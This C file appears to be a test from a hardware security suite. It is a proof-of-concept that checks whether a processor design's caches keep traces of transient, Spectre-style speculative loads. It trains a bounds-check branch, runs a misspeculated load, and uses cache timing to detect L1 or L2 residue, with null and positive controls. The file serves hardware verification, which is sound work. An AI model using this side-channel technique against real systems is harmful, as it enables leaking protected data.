/**
 * l2-residue: transient cache-line allocation in the inclusive L2.
 *
 * Verified window: once an L1D MSHR has sent its AR (sent[i]), the request is
 * on the bus; with L2Inclusive=1 the refill carries arcache=4'b1111
 * (rapt_l1d.sv:1948) so the line ALLOCATES in L2, and rapt_l2.sv has no flush
 * or rollback input at all (port list :61-100).  Separately, a refill that
 * completes >=1 cycle before flush_pipe is installed into L1D and never
 * rolled back (update_enable has no flush term, rapt_l1d_tags.sv:386).
 *
 * This PoC drives a transient load of a marker line through the widened
 * bounds-check window, then asks where the line ended up:
 *   arm A: time the marker immediately  -> L1 class means installed residue;
 *   arm B: evict L1D ONLY (conflict set, never cbo.inval, which would clear
 *          L2 too) then time the marker -> L2 class means the sent-MSHR /
 *          arcache allocation path left an L2 footprint.
 * A null arm runs the same window without the marker access.
 */
#include "bench.h"

#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 100
#endif
#define TRAIN_ROUNDS 20

static uint8_t marker[SC_LINE_BYTES] __attribute__((aligned(SC_LINE_BYTES)));
static uint8_t other[SC_LINE_BYTES] __attribute__((aligned(SC_LINE_BYTES)));
static struct {
  volatile unsigned size;
  uint8_t pad[SC_LINE_BYTES - sizeof(unsigned)];
} bounds __attribute__((aligned(SC_LINE_BYTES)));

__attribute__((noinline))
static void victim(size_t x) {
  if (x < bounds.size) {
    volatile uint8_t t = marker[0];
    (void)t;
  }
}

__attribute__((noinline))
static void victim_null(size_t x) {
  if (x < bounds.size) {
    volatile uint8_t t = other[0];
    (void)t;
  }
}

static void train(void) {
  for (int t = 0; t < TRAIN_ROUNDS; t++)
    victim(t % 8);
}

static void prep(const sc_geom_t *g) {
  sc_evict_l1((const void *)marker, g);
  sc_evict_l2((const void *)marker, g);
  sc_evict_l1((const void *)&bounds, g);
  sc_evict_l2((const void *)&bounds, g);
  sc_fence();
}

int main(void) {
  if (sc_time_selfcheck("l2-residue") != 0)
    return 1;
  sc_geom_t g;
  sc_calibrate(&g);
  if (sc_evict_selftest(&g) != 0) {
    printf("SCRESULT l2-residue ERROR reason=evict\n");
    return 1;
  }
  if (!g.has_l2) {
    printf("SCRESULT l2-residue SKIP reason=no-l2\n");
    printf("[l2-residue] SKIP: this preset has no L2\n");
    return 0;
  }
  bounds.size = 8;
  uint32_t R = SECURITY_ATTACK_ROUNDS;

  /* Positive control: architectural marker touch must register as cached. */
  sc_score_t pos;
  sc_score_reset(&pos);
  for (uint32_t r = 0; r < R; r++) {
    prep(&g);
    volatile uint8_t t = marker[0];
    (void)t;
    sc_fence();
    uint32_t cl = (uint32_t)sc_class(sc_timed_load(marker), &g);
    sc_score_add(&pos, 0, cl == 0 ? g.t_l1 : g.t_l2, &g);
    pos.rounds++;
  }
  int pos_ok = pos.hits[0] >= R / 2;

  sc_score_t aA, aB, nA, nB;
  sc_score_reset(&aA); sc_score_reset(&aB);
  sc_score_reset(&nA); sc_score_reset(&nB);
  for (uint32_t r = 0; r < R; r++) {
    /* Arm A: immediate timing (L1D-installed residue). */
    train(); prep(&g);
    victim(100); sc_fence();
    sc_score_add(&aA, 0, sc_timed_load(marker), &g);
    aA.rounds++;
    train(); prep(&g);
    victim_null(100); sc_fence();
    sc_score_add(&nA, 0, sc_timed_load(marker), &g);
    nA.rounds++;
    /* Arm B: evict L1D only, then time (L2 allocation residue). */
    train(); prep(&g);
    victim(100); sc_fence();
    sc_evict_l1_conflict((const void *)marker, &g);
    sc_score_add(&aB, 0, sc_timed_load(marker), &g);
    aB.rounds++;
    train(); prep(&g);
    victim_null(100); sc_fence();
    sc_evict_l1_conflict((const void *)marker, &g);
    sc_score_add(&nB, 0, sc_timed_load(marker), &g);
    nB.rounds++;
  }

  sc_decision_t dA = sc_decide(&aA, &nA, 0, pos_ok);
  sc_decision_t dB = sc_decide(&aB, &nB, 0, pos_ok);
  printf("[l2-residue] armA(L1) atk=%u/%u null=%u/%u | "
         "armB(L2) atk=%u/%u null=%u/%u pos=%d\n",
         (unsigned)aA.hits[0], (unsigned)R, (unsigned)nA.hits[0], (unsigned)R,
         (unsigned)aB.hits[0], (unsigned)R, (unsigned)nB.hits[0], (unsigned)R,
         pos_ok);
  sc_result("l2-residue-armA", &dA, pos_ok, 0, R, &g);
  sc_result("l2-residue-armB", &dB, pos_ok, 0, R, &g);
  if (dB.verdict == SC_VULNERABLE)
    printf("[l2-residue] VULNERABLE: transient line allocated in L2 "
           "(no L2 flush path)\n");
  else if (dA.verdict == SC_VULNERABLE)
    printf("[l2-residue] VULNERABLE: transient line installed in L1D "
           "(never rolled back)\n");
  else if (!pos_ok)
    printf("[l2-residue] INCONCLUSIVE: positive control failed\n");
  else
    printf("[l2-residue] NOT VULNERABLE or insufficient signal\n");
  return 0;
}